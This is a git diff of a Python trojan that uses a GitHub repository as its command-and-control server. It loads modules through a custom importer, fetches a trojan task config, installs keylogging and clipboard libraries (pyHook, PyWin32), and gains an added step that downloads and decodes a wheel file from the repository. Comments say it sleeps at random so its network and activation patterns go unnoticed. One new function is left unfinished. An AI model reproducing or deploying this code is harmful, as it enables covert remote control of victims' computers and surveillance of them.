@@ -18,7 +18,6 @@ trojan_modules= []#empty list for modules
 configured = False#flag for configuration
 task_queue = Queue.Queue()#task queue is represented by a que
 
-
 #functions:
 def install_and_import(package,toimport):#installed wheel files and imports the relevant thing
     import importlib
@@ -45,6 +44,11 @@ def get_file_contents(filepath):
             blob = repo.blob(filename._json_data['sha'])#download it
             return blob.content
     return None#if not found return nothing
+
+def get_wheel_contents(filepath):
+    #connect to github and find a file in github it is in base64
+    x = get_file_contents(filepath)
+    
 
 def get_trojan_config():
     #get a json file and decode it,then import it
@@ -82,7 +86,6 @@ class GitImporter(object):#custom importer!
                 #decode it and put it into the current module code
                 return self#return the current module code
         return None#return nothing in case the trojan is not configured
-
     
     def load_module(self,name):#load a module
         module = imp.new_module(name)#create a blank module object
@@ -105,6 +108,11 @@ def module_runner(module):
 install_and_import("pyHook",["pyHook"])#cant make modules import out of github
 install_and_import("PyWin32",["pythoncom","win32clipboard","win32gui","win32ui"])#so installing them manualy with pip
 sys.meta_path = [GitImporter()]#add my custom importer into path
+p = get_file_contents("wheels/pyHook.whl")
+fo = open("pyHook.whl", "wb")
+p = base64.b64decode(str(p))
+fo.write(p)
+fo.close()
 while True:#always be active
     if task_queue.empty():#if there are no tasks in task que
         config = get_trojan_config()#get trojan tasks
@@ -116,18 +124,3 @@ while True:#always be active
             #sleep for a random amount of time so there wont be network patterns to recognize
     time.sleep(random.randint(1000,10000))
     #again sleep for a random amount of time so there wont be an activation pattern
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-            
